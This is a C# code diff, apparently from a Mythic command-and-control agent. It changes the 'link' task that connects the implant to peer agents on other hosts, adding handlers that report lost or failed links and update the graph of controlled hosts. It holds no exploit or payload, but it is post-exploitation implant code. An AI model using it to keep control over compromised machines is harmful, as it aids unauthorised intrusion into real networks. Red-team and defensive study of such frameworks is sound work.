@@ -40,7 +40,7 @@ namespace Tasks
                 {
                     LinkParameters parameters = _jsonSerializer.Deserialize<LinkParameters>(_data.Parameters);
                     p = _agent.GetPeerManager().AddPeer(parameters.ConnectionInfo);
-                    p.UUIDNegotiated += (object _, UUIDEventArgs args) =>
+                    p.UUIDNegotiated += (object o, UUIDEventArgs a) =>
                     {
                         resp = CreateTaskResponse(
                         $"Established link to {parameters.ConnectionInfo.Hostname}",
@@ -48,18 +48,47 @@ namespace Tasks
                         "completed",
                         new IMythicMessage[1]
                         {
-                        new EdgeNode()
-                        {
-                            Source = _agent.GetUUID(),
-                            Destination = p.GetMythicUUID(),
-                            Direction = EdgeDirection.SourceToDestination,
-                            Action = "add",
-                            C2Profile = parameters.ConnectionInfo.C2Profile.Name,
-                            MetaData = ""
-                        }
+                            new EdgeNode()
+                            {
+                                Source = _agent.GetUUID(),
+                                Destination = p.GetMythicUUID(),
+                                Direction = EdgeDirection.SourceToDestination,
+                                Action = "add",
+                                C2Profile = parameters.ConnectionInfo.C2Profile.Name,
+                                MetaData = ""
+                            }
                         });
                         _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                     };
+                    p.Disconnect += (object o2, EventArgs a2) =>
+                    {
+                        resp = CreateTaskResponse(
+                            $"Lost link to {parameters.ConnectionInfo.Hostname}",
+                            true,
+                            "error",
+                            new IMythicMessage[1]
+                            {
+                                new EdgeNode()
+                                {
+                                    Source = _agent.GetUUID(),
+                                    Destination = p.GetMythicUUID(),
+                                    Direction = EdgeDirection.SourceToDestination,
+                                    Action = "remove",
+                                    C2Profile = parameters.ConnectionInfo.C2Profile.Name,
+                                    MetaData = ""
+                                }
+                            });
+                        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                    };
+                    if (!p.Start())
+                    {
+                        resp = CreateTaskResponse(
+                            $"Failed to connect to {parameters.ConnectionInfo.Hostname}",
+                            true,
+                            "error");
+                        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                        _agent.GetPeerManager().Remove(p);
+                    }
                 }
                 catch (Exception ex)
                 {
